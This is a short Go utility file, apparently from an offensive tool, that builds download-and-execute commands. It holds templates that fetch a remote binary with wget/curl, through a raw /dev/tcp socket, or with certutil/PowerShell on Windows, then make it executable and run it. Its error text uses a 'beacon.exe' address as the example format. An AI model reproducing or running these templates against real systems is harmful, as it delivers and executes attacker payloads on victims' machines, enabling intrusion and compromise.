package utils

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"
)

var (
	UnixDownloader = "wget %s -O /tmp/%s || curl %s -o %s && chmod +x /tmp/%s && /tmp/%s"
	TCPDownloader  = "exec 88<>/dev/tcp/%s && echo -e \".%s\" >&88 && cat <&88 > /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
	WinDownloader  = "certutil.exe -urlcache -split -f %s C:/Windows/Temp/%s || powershell.exe Invoke-WebRequest %s -O C:/Windows/Temp/%s & C:/Windows/Temp/%s"
)

func IsContain(items []string, item string) bool {
	for _, eachItem := range items {
		if eachItem == item {
			return true
		}
	}
	return false
}

func RandString(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func GenerateCMD(cmdtype, addr, filename, exec string) (cmd string) {
	switch cmdtype {
	case "unix":
		cmd = fmt.Sprintf(UnixDownloader, addr, filename, addr, filename, filename, exec)
	case "tcp":
		tcpaddr := strings.Split(addr, "/")
		if len(tcpaddr) < 2 {
			log.Println("TCP下载地址错误，参考格式：192.168.0.1:8553/beacon.exe")
			return ""
		}
		_addr := strings.Replace(tcpaddr[0], ":", "/", -1)
		path := strings.Replace(addr, tcpaddr[0], "", 1)
		cmd = fmt.Sprintf(TCPDownloader, _addr, path, filename, filename, exec)
	case "win":
		cmd = fmt.Sprintf(WinDownloader, addr, filename, addr, filename, exec)
	}
	return cmd
}
